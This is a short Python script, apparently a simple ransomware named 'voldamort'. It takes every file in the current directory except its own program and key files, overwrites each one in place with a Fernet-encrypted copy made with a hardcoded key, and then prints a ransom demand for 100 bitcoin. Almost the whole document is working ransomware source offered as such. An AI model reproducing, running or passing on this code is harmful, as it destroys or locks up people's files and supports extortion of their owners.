import os,time
from cryptography.fernet import Fernet
files = []

for file in os.listdir():
    if file not in ["voldamort.py","TheKey.key","voldamort_fix.py","voldamort.exe","voldamort_fix.exe"]:
        if os.path.isfile(file):
            files.append(file)

# key = Fernet.generate_key()
# with open("TheKey.key","wb") as keyfile:
#     keyfile.write(key)

key = "N2Q30S2gxxCA83cyiDgr3HtXbdUW69XMlaUSCN_QDpw="
for file in files:
    with open(file,"rb") as the_file:
        contents = the_file.read()
    encrypted_data = Fernet(key).encrypt(contents)
    with open(file,"wb") as the_file:
        the_file.write(encrypted_data)

print("your data is encrpyted :) . now pay me 100 bitcoin to get your data back. :)")
close = input("type 'e' to exit :- ")